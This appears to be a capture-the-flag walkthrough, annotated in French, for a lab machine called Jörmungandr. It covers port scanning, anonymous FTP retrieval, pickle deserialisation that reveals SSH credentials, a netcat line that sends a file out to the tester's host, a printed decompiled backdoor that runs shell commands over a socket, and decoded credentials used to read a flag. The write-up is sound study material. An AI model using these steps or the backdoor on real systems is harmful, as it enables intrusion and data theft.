Jörmungandr

IP Address
10.10.231.242

$> nmap -vv 10.10.231.242 -p-
Starting Nmap 7.60 ( https://nmap.org ) at 2024-06-10 12:51 BST
Initiating ARP Ping Scan at 12:51
Scanning 10.10.231.242 [1 port]
Completed ARP Ping Scan at 12:51, 0.22s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:51
Completed Parallel DNS resolution of 1 host. at 12:51, 0.00s elapsed
Initiating SYN Stealth Scan at 12:51
Scanning ip-10-10-231-242.eu-west-1.compute.internal (10.10.231.242) [65535 ports]
Discovered open port 21/tcp on 10.10.231.242
Discovered open port 22/tcp on 10.10.231.242

ftp 10.10.231.242
Connected to 10.10.231.242.
220 (vsFTPd 3.0.3)
Name (10.10.231.242:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -a
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Jan 19  2022 .
drwxr-xr-x    2 ftp      ftp          4096 Jan 19  2022 ..
-rw-r--r--    1 ftp      ftp          5409 Jan 19  2022 .hidden
-rw-r--r--    1 ftp      ftp           124 Jan 19  2022 poem.txt
226 Directory send OK.
ftp> get .hidden
local: .hidden remote: .hidden
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for .hidden (5409 bytes).
226 Transfer complete.
5409 bytes received in 0.00 secs (2.8484 MB/s)
ftp> get poem.txt
local: poem.txt remote: poem.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for poem.txt (124 bytes).
226 Transfer complete.
124 bytes received in 0.00 secs (245.6263 kB/s)

cat .hidden 


cat poem.txt 
Handar em ek vanr,
en þú hróðrsvitnis,
böl er beggja þrá;
ulfgi hefir ok vel,
er í böndum skal
bíða ragnarökrs.

python

import pickle

# Texte binaire fourni
binary_text = """

"""

# Retirer les espaces et les nouvelles lignes
binary_text = binary_text.replace(" ", "").replace("\n", "")

# Convertir le texte binaire en bytes
byte_array = bytearray()
for i in range(0, len(binary_text), 8):
    byte = binary_text[i:i+8]
    byte_array.append(int(byte, 2))

# Désérialiser avec pickle
data = pickle.loads(byte_array)

print(data)



# Résultat obtenu après désérialisation
data = [
    ('ssh_pass0', 'I'), ('ssh_pass21', 'n'), ('ssh_user0', 'f'), ('ssh_pass1', '_'), ('ssh_pass26', 'g'), 
    ('ssh_pass11', '_'), ('ssh_pass12', 'o'), ('ssh_pass23', '_'), ('ssh_pass15', 'n'), ('ssh_pass2', 'w'), 
    ('ssh_pass3', 'i'), ('ssh_pass6', '_'), ('ssh_pass17', 'd'), ('ssh_pass19', 'r'), ('ssh_pass16', '_'), 
    ('ssh_pass10', 'l'), ('ssh_pass13', 'd'), ('ssh_pass18', 'u'), ('ssh_pass22', 'g'), ('ssh_pass25', 'a'), 
    ('ssh_pass8', 'i'), ('ssh_pass27', 'n'), ('ssh_pass24', 'r'), ('ssh_user3', 'r'), ('ssh_pass5', 'l'), 
    ('ssh_pass31', 'k'), ('ssh_user5', 'r'), ('ssh_user2', 'n'), ('ssh_user1', 'e'), ('ssh_user4', 'i'), 
    ('ssh_pass29', 'r'), ('ssh_pass7', 'k'), ('ssh_pass4', 'l'), ('ssh_pass20', 'i'), ('ssh_pass9', 'l'), 
    ('ssh_pass14', 'i'), ('ssh_pass28', 'a'), ('ssh_pass30', 'o')
]

# Dictionnaires pour stocker les fragments des mots de passe et des utilisateurs
password_fragments = {}
user_fragments = {}

# Classer les fragments dans les dictionnaires appropriés
for key, value in data:
    if key.startswith('ssh_pass'):
        index = int(key[8:])
        password_fragments[index] = value
    elif key.startswith('ssh_user'):
        index = int(key[8:])
        user_fragments[index] = value

# Reconstituer les mots de passe et les noms d'utilisateurs
password = ''.join(password_fragments[i] for i in sorted(password_fragments.keys()))
user = ''.join(user_fragments[i] for i in sorted(user_fragments.keys()))

print(f"Mots de passe reconstitué : {password}")
print(f"Nom d'utilisateur reconstitué : {user}")


Mots de passe reconstitué : I_will_kill_odin_during_ragnarok
Nom d'utilisateur reconstitué : fenrir

root@ip-10-10-225-32:~# ssh fenrir@10.10.211.143
fenrir@midgard:~$ ls
mjollnir.pyc

nc -lvnp 5555 > mjollnir.pyc
cat mjollnir.pyc | nc 10.21.7.245 5555


decompile fichier pyc:

pip install uncompyle6

uncompyle6 -o . mjollnir.pyc
mjollnir.pyc -- 
# Successfully decompiled file

# uncompyle6 version 3.9.1
# Python bytecode version base 3.8.0 (3413)
# Decompiled from: Python 3.12.3 (main, Apr 17 2024, 00:00:00) [GCC 13.2.1 20240316 (Red Hat 13.2.1-7)]
# Embedded file name: .mjollnir.py
# Compiled at: 2022-01-19 14:49:25
# Size of source mod 2**32: 2225 bytes
from Crypto.Util.number import bytes_to_long, long_to_bytes
import sys, textwrap, socketserver, string, readline, threading
from time import *
import getpass, os, subprocess
username = long_to_bytes(128672430374905338731062386L)
password = long_to_bytes(33643248411776211125062560554130339746417025421355137140099645078910060553582L)

class Service(socketserver.BaseRequestHandler):

    def ask_creds(self):
        username_input = self.receive(b'Username: ').strip()
        password_input = self.receive(b'Password: ').strip()
        print(username_input, password_input)
        if username_input == username:
            if password_input == password:
                return True
        return False

    def handle(self):
        loggedin = self.ask_creds()
        if not loggedin:
            self.send(b'Wrong credentials!')
            return
        self.send(b'Successfully logged in!')
        while True:
            command = self.receive(b'C:\\User\\Jormungandr> ')
            p = subprocess.Popen(command,
              shell=True, stdout=(subprocess.PIPE), stderr=(subprocess.PIPE))
            self.send(p.stdout.read())

    def send(self, string, newline=True):
        if newline:
            string = string + b'\n'
        self.request.sendall(string)

    def receive(self, prompt=b'> '):
        self.send(prompt, newline=False)
        return self.request.recv(4096).strip()


class ThreadedService(socketserver.ThreadingMixIn, socketserver.TCPServer, socketserver.DatagramRequestHandler):
    pass


def main():
    print("Starting server...")
    port = 7432
    host = "0.0.0.0"
    service = Service
    server = ThreadedService((host, port), service)
    server.allow_reuse_address = True
    server_thread = threading.Thread(target=(server.serve_forever))
    server_thread.daemon = True
    server_thread.start()
    print("Server started on " + str(server.server_address) + "!")
    while True:
        sleep(10)


if __name__ == "__main__":
    main()



pip install pycryptodome

python

from Crypto.Util.number import long_to_bytes

# Les entiers longs
username_long = 128672430374905338731062386
password_long = 33643248411776211125062560554130339746417025421355137140099645078910060553582

# Conversion en bytes
username_bytes = long_to_bytes(username_long)
password_bytes = long_to_bytes(password_long)

# Conversion des bytes en chaîne de caractères (décodage)
username = username_bytes.decode('utf-8')
password = password_bytes.decode('utf-8')

print("Username:", username)
print("Password:", password)


Username: jormungandr
Password: Jag_ar_Jormungandr_midgardsormen


$> nc 10.10.105.209 7432
Username: jormungandr
Password: Jag_ar_Jormungandr_midgardsormen
Successfully logged in!
C:\User\Jormungandr> ls

C:\User\Jormungandr> dir /home/jormungandr
user.txt

C:\User\Jormungandr> cat /home/jormungandr/user.txt
EPI{k0mi0_a0_5kUlDAD09um}

